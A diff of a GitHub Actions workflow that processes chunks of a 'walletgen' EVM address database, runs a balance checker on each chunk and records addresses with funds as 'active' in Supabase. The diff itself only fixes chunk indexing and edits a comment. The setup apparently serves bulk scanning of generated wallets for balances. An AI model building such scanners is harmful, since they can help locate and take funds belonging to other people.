@@ -27,16 +27,17 @@ jobs:
           last=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress?select=last_index" \
             -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq -r '.[0].last_index')
           if [ "$last" = "null" ] || [ -z "$last" ]; then
-            last=0
+            last=1
           fi
           echo "last_index=$last" >> $GITHUB_OUTPUT
 
       - name: Prepare chunk of database
         run: |
           start=${{ steps.index.outputs.last_index }}
-          end=$((start + 100000))
-          echo "Extracting lines $start to $end"
-          sed -n "$start,$end p" walletgen/evm_database.txt > walletgen/evm_chunk.txt
+          chunk_size=100000
+          total=$(wc -l < walletgen/evm_database.txt)
+          echo "Preparing chunk starting at line $start, size $chunk_size (total $total)"
+          tail -n +"$start" walletgen/evm_database.txt | head -n "$chunk_size" > walletgen/evm_chunk.txt
 
       - name: Run checker with expect on chunk
         working-directory: walletgen
@@ -65,7 +66,7 @@ jobs:
           awk '/address:/ {addr=$2} /balance:/ {bal=$2;
             status="empty";
             if (bal!="(empty)" && bal!="0.000000$") status="active";
-            # Insert into Supabase if not present
+            # Check Supabase
             cmd="curl -s \"${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq."addr"\" -H \"apikey: ${{ secrets.SUPABASE_KEY }}\" -H \"Authorization: Bearer ${{ secrets.SUPABASE_KEY }}\""
             cmd | getline exists
             close(cmd)
